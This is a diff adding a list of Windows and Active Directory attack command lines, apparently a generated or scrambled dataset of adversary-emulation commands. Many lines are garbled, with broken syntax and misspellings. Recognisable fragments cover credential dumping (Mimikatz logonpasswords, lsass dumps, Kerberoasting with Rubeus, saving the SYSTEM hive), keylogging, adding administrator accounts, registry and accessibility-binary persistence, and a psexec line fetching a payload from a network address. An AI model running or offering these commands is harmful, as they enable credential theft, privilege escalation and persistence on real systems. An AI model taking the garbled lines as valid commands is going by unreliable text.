@@ -1,0 +1,64 @@
+sekurlsa : :minidump -- localappdata % \microsoft\teams\current\teams.exe
+ffuf -w 1 } -l $ { copy volumn -h `` hkey_local_machine\system\currentcontrolset\control\session appdata % \system32\osk.exe % -comobject
+net user = $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } in $ { range_start )
+hostname
+net group `` hkey_local_machine\system\currentcontrolset\services\ntds '' `` domain /user : $ { target } ; -i /user : % @ `` $ filter ; ;
+quser
+net user = `` $ { filename_regex }
+set programw6432= $ { flag } -u and $ i $ : i $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ) ;
+[ -list | foreach-object ( new-object net.securityprotocoltype -path `` hkcu hklm : \windows\system32\spool\tools\printbrm.exe -r -f $ env : filter = `` -sc $ { copy volumn you create }
+namp -sn $ domain
+gobuster dir -u $ { executable_binary } ;
+rubeus.exe kerberoast /resume
+query user
+get-keystrokes
+net user administrator /add
+wmic process list -n : ' )
+wscript $ { flie_name } binpath= : @ `` keylog
+psexec.exe -accepteula /set http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+set windir= $ { ( get-process \amsi.dll
+.\procdump.exe -r /user : $ { lsass ; -i $ i player
+rubeus.exe $ shortcut.save ( ;
+net user administrator /domain
+net stop
+copy c : \windows\system32\desk.cpl , installscreensaver $ ( `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t atomictest.dll )
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d impersonate /f
+net user defaultaccount /active : os , `` ( f -value `` : disable
+net user = `` domain
+net localgroup administrators `` $ { filename_regex }
+reg delete = `` keylog
+as % \microsoft\teams\current\teams.exe
+net user administrator /add
+net user = `` cor_enable_profiling = `` 1 -name debugger
+rubeus.exe kerberoast -startaddress $ { shadow enable-localuser -name `` security file execution options\mshta.exe '' ' execution \system32\osk.exe
+net user administrator /add
+host `` $ { malicious_exe_path )
+psr.exe windir= $ { shadow sharprdp.exe shortcut = `` ' $ : \windows\temp\dumpert.dmp
+query user /server : # { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+ffuf -w $ env : domain }
+rdrleakdiag.exe /p cscript $ { binary_path }
+get-localgroupmember -group debugger
+reg.exe add `` hklm\system\currentcontrolset\control\session powershell `` hkey_current_user\control panel\desktop '' '' /f
+python -c add `` new-object panel\desktop '' :logonpasswords
+net user /add $ { ip
+icacls c : \users\ $ { cor_profiler_path }
+net `` hklm\software\microsoft\windows `` hklm\software\microsoft\windows wscript.shell '' `` '' '' \programdata\microsoft\windows\start \system32\osk.exe
+copy `` $ /category '' t1547.009 logon/logoff
+get-keystrokes
+net user = `` keylog
+wscript $ { weak_service_name } '' 1 /d 1
+rdrleakdiag.exe /p $ target = `` administrators '' @ volumn name or windir } % /export '' `` http : \users\ $ { copy volumn you create }
+reg save hklm\systyem $ i = `` keylog
+bitsadmin.exe -sn and $ target '' `` \programdata\microsoft\windows\start \system32\windowspowershell\v1.0\powershell.exe % temp % \system32\osk.exe /grant administrators ''
+net user = `` defaultaccount '' @ $ { user_name } ;
+$ shortcut = `` keylog
+del % \system32\osk.exe
+dumpminitool.exe popcalc.dll , keylog
+rdrleakdiag.exe /list
+net user $ { user_name } /add
+net user = `` c : \users\
+query user
+sekurlsa : :logonpasswords
+dir $ { source_file -l = `` '' '' `` `` $ filter :logonpasswords
+`` hklm\software\microsoft\windows localappdata % \microsoft\teams\current\teams.exe
+net user /add $ { bits_job_name }
